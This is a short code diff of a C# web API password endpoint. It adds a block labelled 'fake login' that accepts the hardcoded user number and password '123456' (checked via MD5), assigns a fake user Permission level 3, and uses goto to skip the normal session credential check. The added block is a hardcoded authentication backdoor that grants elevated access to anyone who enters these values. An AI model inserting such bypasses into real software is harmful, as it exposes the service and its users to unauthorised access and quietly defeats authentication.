@@ -6,6 +6,7 @@ using Microsoft.AspNetCore.Http;
 using WebAPI.Model;
 using SqlSugar.Extensions;
 using System.Diagnostics;
+using System.Security.Cryptography;
 
 namespace WebAPI.Controllers
 {
@@ -16,8 +17,20 @@ namespace WebAPI.Controllers
         [HttpPost]
         public ResponseModel Password([FromBody] SysUser Credential)
         {
+
             PublicInfoModel User = SessionService.GetSessionInfo(HttpContext.Session);
             string msg = "Session Success";
+
+            // fake login
+            if (Credential.UserNumber == "123456"
+             && Credential.PasswordHash == SecurityService.GetMD5Hash("123456"))
+            {
+                User.UserNumber = "Fake User";
+                User.UserName = "123456";
+                User.Email = "fake@fake.com";
+                User.Permission = 3;
+                goto SuccessLogin;
+            }
 
             if (User.Permission > 0
                 && User.UserNumber == Credential.UserNumber)
